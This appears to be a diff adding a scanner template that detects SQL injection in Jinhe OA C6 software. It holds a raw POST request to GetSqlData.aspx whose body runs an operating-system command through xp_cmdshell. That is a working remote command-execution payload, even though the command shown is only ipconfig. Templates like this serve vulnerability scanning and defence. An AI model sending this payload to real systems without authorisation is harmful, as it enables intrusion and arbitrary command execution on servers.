@@ -1,0 +1,32 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - Windows IP
+    - Log Helper
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /C6/Control/GetSqlData.aspx/.ashx
+
+    Host: {{Hostname}}
+
+    Connection: close
+
+    Content-Type: text/plain
+
+    Accept-Encoding: gzip
+
+
+    exec master..xp_cmdshell ''ipconfig''
+
+    '
+id: jinhe-oa-c6-getSqlData-sqli
+info:
+  author: Co5mos
+  name: Jinhe OA C6 - SQL Injection
+  severity: critical
